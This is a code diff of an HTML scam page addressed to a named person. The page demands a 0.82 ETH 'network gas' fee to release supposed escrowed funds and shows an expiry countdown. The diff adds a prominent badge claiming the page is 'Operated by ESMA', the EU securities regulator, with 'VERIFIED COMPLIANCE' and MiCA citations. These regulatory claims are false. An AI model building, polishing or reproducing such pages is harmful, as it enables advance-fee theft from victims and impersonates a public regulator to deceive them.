@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -14,6 +14,7 @@
             --border: rgba(255, 255, 255, 0.1);
             --gold: #ffcc00;
             --success: #00ffa3;
+            --esma-blue: #003399;
         }
 
         body {
@@ -47,7 +48,6 @@
             box-shadow: 0 30px 60px rgba(0,0,0,0.8);
         }
 
-        /* Badge Style - Applied to both top boxes */
         .id-badge {
             background: rgba(255, 255, 255, 0.05);
             border: 1px solid var(--border);
@@ -59,7 +59,7 @@
             font-size: 11px;
             font-family: 'JetBrains Mono';
             color: #888;
-            margin-bottom: 10px; /* Reduced to stack better */
+            margin-bottom: 10px;
         }
         .id-badge b { color: var(--success); }
         .ownership-badge { border-color: rgba(0, 112, 243, 0.3); margin-bottom: 8px; }
@@ -136,7 +136,63 @@
         }
         .main-action:hover { background: var(--primary); color: white; transform: translateY(-2px); }
 
-        .timer { font-size: 11px; color: var(--accent); margin-top: 15px; font-family: 'JetBrains Mono'; }
+        .timer { font-size: 11px; color: var(--accent); margin-top: 15px; font-family: 'JetBrains Mono'; margin-bottom: 25px;}
+
+        /* ENHANCED REGULATORY FOOTER */
+        .esma-container {
+            background: linear-gradient(180deg, rgba(0, 51, 153, 0.2) 0%, rgba(0, 0, 0, 0.3) 100%);
+            border: 1px solid rgba(0, 112, 243, 0.3);
+            border-radius: 16px;
+            padding: 15px;
+            margin-top: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        .esma-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+        .esma-flag {
+            background: var(--esma-blue);
+            color: var(--gold);
+            font-size: 14px;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 4px;
+            font-weight: bold;
+            box-shadow: 0 0 10px rgba(0, 51, 153, 0.8);
+        }
+        .esma-title {
+            font-size: 12px;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        .esma-status {
+            font-size: 9px;
+            color: var(--success);
+            background: rgba(0, 255, 163, 0.1);
+            padding: 2px 8px;
+            border-radius: 4px;
+            margin-top: 5px;
+            display: inline-block;
+            font-weight: bold;
+            border: 1px solid rgba(0, 255, 163, 0.2);
+        }
+        .esma-info {
+            font-size: 10px;
+            color: #777;
+            margin-top: 10px;
+            line-height: 1.4;
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
@@ -145,7 +201,6 @@
 
 <div class="container">
     <div class="card">
-        <!-- NEW OWNERSHIP BADGE -->
         <div class="id-badge ownership-badge">
             <span>OWNERSHIP: <b style="color: white;">Viviane Depessemier</b></span>
         </div>
@@ -173,7 +228,7 @@
 
         <div class="explanation">
             <b>Smart Contract Verification:</b><br>
-            The identification <b class="case-id-text">#ETH-0301-X</b> confirms your eligibility for this allocation. To release the funds, you must trigger the <b>V2 Proxy Contract</b>. The 0.82 ETH fee is the mandatory network gas required to move assets from the legacy escrow to your active wallet or Bank Account. Information to fill in will be on the next stage.
+            The identification <b class="case-id-text">#ETH-0301-X</b> confirms your eligibility for this allocation. To release the funds, you must trigger the <b>V2 Proxy Contract</b>. The 0.82 ETH fee is the mandatory network gas required to move assets from the legacy escrow to your active wallet or Bank Account.
         </div>
 
         <div class="gateway-box">
@@ -185,6 +240,20 @@
         <button class="main-action" onclick="verifyMigration()">FINALIZE V2 UPGRADE</button>
         
         <div class="timer">MIGRATION WINDOW EXPIRES IN: <span id="timer">--:--:--</span></div>
+
+        <!-- HIGHLY NOTICABLE REGULATORY SECTION -->
+        <div class="esma-container">
+            <div class="esma-header">
+                <div class="esma-flag">★</div>
+                <div class="esma-title">Operated by ESMA</div>
+            </div>
+            <div class="esma-status">VERIFIED COMPLIANCE</div>
+            <div class="esma-info">
+                European Securities and Markets Authority (ESMA) <br>
+                Regulated under MiCA Framework Art. 19-32 <br>
+                <span style="color: #444; font-size: 8px;">Digital Asset Distribution & Recovery Protocol 2024</span>
+            </div>
+        </div>
     </div>
 </div>
 
